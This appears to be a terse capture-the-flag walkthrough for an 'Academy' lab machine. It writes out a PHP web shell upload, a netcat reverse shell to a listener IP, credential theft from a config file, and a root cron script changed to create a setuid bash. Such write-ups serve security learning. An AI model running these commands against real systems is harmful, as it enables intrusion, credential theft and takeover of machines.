Step to exploit access to ftp ge student credential, ip/academy get to portal of the app. After access upload  cmd.php has content <?php system($_GET['cmd']); ?> 
After that gt reverse shell 
```bash

nc -lvnp 4444 (run in kali)

cmd.php?cmd=nc 10.0.2.15 4444 -e /bin/bash

```

After get the shell move to home dir and get "grimmie" redentail in 
```bash
cat /var/www/html/academy/includes/config.php
```
And using su to change account after that we can change backup.sh
it has crontab privilage which is root so we modify it
```bash
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
 /////
/tmp/rootbash -p
whoami /// To access root shell

```

Ok and we get a flag
